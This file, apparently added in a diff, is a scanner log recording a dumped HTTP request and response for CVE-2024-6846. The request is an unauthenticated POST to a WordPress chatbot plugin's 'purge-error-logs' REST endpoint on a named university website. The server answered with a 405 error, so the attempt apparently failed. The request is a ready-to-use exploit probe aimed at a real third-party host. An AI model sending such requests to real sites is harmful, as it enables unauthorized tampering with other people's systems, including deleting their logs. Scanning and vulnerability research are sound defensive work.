@@ -1,0 +1,42 @@
+[CVE-2024-6846] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-json/wdgpt/v1/purge-error-logs
+
+
+POST /wp-json/wdgpt/v1/purge-error-logs HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 14
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"months":"1"}
+[CVE-2024-6846] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-json/wdgpt/v1/purge-error-logs
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:01 GMT
+Server: AmazonS3
+Via: 1.1 67e0252f80139a17537e71117acd6be0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 5B3EZnHhX-0f0voYXJQUQZX5YxNAv4FMeATtqLf43Md3dx3JY32C5Q==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: YT0TYSE3VY7RPVZB</li>
+<li>HostId: 269q5ikVJb5yN2IUsjk7OeasJDwUvtOWEIfB/Gr3tULK6ZuBu/wvrqHE7fCD1MToAmq5gtkLqyE=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
